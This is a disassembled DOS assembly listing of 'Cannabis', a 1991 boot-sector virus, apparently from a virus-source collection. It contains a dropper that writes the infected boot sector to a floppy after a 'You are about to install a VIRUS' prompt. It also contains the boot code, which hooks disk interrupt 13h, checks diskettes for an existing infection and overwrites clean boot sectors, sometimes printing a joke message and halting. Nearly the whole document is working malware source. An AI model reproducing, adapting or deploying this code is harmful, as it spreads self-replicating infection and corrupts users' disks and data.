
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        CANNAB1				         €€
;€€								         €€
;€€      Created:   4-Oct-91					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_3e		equ	43Fh
data_8e		equ	5Ch
data_17e	equ	46Ch			;*
data_18e	equ	7C00h			;*
data_19e	equ	7C0Bh			;*
data_20e	equ	7D31h			;*
data_21e	equ	7D35h			;*
data_22e	equ	7D73h			;*
data_23e	equ	7E00h			;*
data_24e	equ	7E0Bh			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

cannab1		proc	far

start:
		mov	dx,13Dh
		dec	byte ptr ds:data_8e
		js	loc_2			; Jump if sign=1
		mov	dx,155h
		call	sub_1
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		and	al,0DFh
		cmp	al,59h			; 'Y'
		jne	loc_ret_3		; Jump if not equal
		mov	dl,0
		mov	ah,0
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		jc	loc_1			; Jump if carry Set
		mov	dx,1E6h
		call	sub_1
		mov	cx,1
		mov	bx,offset data_12
		mov	ax,301h
		cwd				; Word to double word
		int	13h			; Disk  dl=drive a  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jnc	loc_ret_3		; Jump if carry=0
loc_1:
		mov	dx,offset data_9+0B7h	; ('')

cannab1		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
loc_2:
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx

loc_ret_3:
		retn
sub_1		endp

data_9		db	'Usage:  <FILENAME> A:', 0Dh, 0Ah
		db	'$'
		db	'You are about to install a VIRUS'
		db	' on your diskette!!!', 0Dh, 0Ah, 'I'
		db	'nsert a formatted 360K diskette '
		db	'into the drive.', 0Dh, 0Ah, 'Are'
		db	' you sure you want to proceed (y'
		db	'/N)? $'
		db	0Dh, 0Ah, 0Ah, 'Writing...$'
		db	0Dh, 0Ah, 'Error !!!'
		db	 07h, 24h
data_12		db	0EBh
		db	 3Ch, 90h
		db	'Cannabis'
		db	0
		db	 02h, 02h, 01h, 00h, 02h, 70h
		db	 00h,0D0h, 02h,0FDh, 02h, 00h
		db	 09h, 00h, 02h, 00h
		db	34 dup (0)
		db	0FAh, 33h,0C0h, 8Eh,0D8h, 8Eh
		db	0D0h,0BCh, 00h, 7Ch,0FBh,0BBh
		db	0B1h, 7Ch,0A1h, 4Ch, 00h, 3Bh
		db	0C3h, 74h, 34h,0A3h, 31h, 7Dh
		db	0A1h, 4Eh, 00h,0A3h, 33h, 7Dh
		db	 1Eh,0B8h, 10h, 00h, 8Eh,0D8h
		db	0A1h, 13h, 03h, 48h, 48h,0A3h
		db	 13h, 03h, 1Fh,0B1h, 06h,0D3h
		db	0E0h, 2Dh,0C0h, 07h, 8Eh,0C0h
		db	0B9h, 00h, 02h,0BEh, 00h, 7Ch
		db	 8Bh,0FEh,0FCh,0F3h,0A4h, 89h
		db	 1Eh, 4Ch, 00h, 8Ch, 06h, 4Eh
		db	 00h
		db	0F6h, 06h, 6Ch, 04h, 07h, 75h
		db	 08h
		db	0BEh, 35h, 7Dh,0E8h, 0Eh, 00h
loc_6:
		jmp	short loc_6
loc_7:
		mov	si,data_22e
		call	sub_2
		xor	ax,ax			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		int	19h			; Bootstrap loader

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
loc_8:
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_ret_9		; Jump if zero
		mov	ah,0Eh
		mov	bx,7
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_8

loc_ret_9:
		retn
sub_2		endp

		push	ax
		push	ds
		cmp	ah,4
		jae	loc_10			; Jump if above or =
		cmp	ah,2
		jb	loc_10			; Jump if below
		test	dl,0FEh
		jnz	loc_10			; Jump if not zero
		xor	ax,ax			; Zero register
		mov	ds,ax
		test	byte ptr ds:data_3e,1
		jnz	loc_10			; Jump if not zero
		call	sub_3
loc_10:
		pop	ds
		pop	ax
		jmp	dword ptr cs:data_20e

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
		push	cx
		push	bx
		push	di
		push	si
		push	es
		mov	di,2
loc_11:
		mov	ah,2
		mov	al,1
		mov	bx,7E00h
		mov	cx,1
		push	cs
		pop	es
		pushf				; Push flags
		call	dword ptr cs:data_20e
		jnc	loc_12			; Jump if carry=0
		xor	ax,ax			; Zero register
		pushf				; Push flags
		call	dword ptr cs:data_20e
		dec	di
		jnz	loc_11			; Jump if not zero
		jmp	short loc_13
		db	90h
loc_12:
		mov	si,data_23e
		mov	di,data_18e
		push	cs
		pop	ds
		cld				; Clear direction
		mov	cx,0Bh
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_13			; Jump if zero
		mov	si,data_24e
		mov	di,data_19e
		mov	cx,33h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,301h
		mov	bx,7C00h
		mov	cx,1
		pushf				; Push flags
		call	dword ptr cs:data_20e
loc_13:
		pop	es
		pop	si
		pop	di
		pop	bx
		pop	cx
		retn
sub_3		endp

		db	0, 0, 0, 0
		db	0Dh, 0Ah, 'Hey man, I don', 27h, 't'
		db	' wanna work. I', 27h, 'm too sto'
		db	'ned right now...'
		db	7
		db	0Dh, 0Ah, 0
		db	0Dh, 0Ah, 'Non-System disk or dis'
		db	'k error', 0Dh, 0Ah, 'Replace and'
		db	' press a key when ready', 0Dh, 0Ah
		db	70 dup (0)
		db	 55h,0AAh

seg_a		ends



		end	start
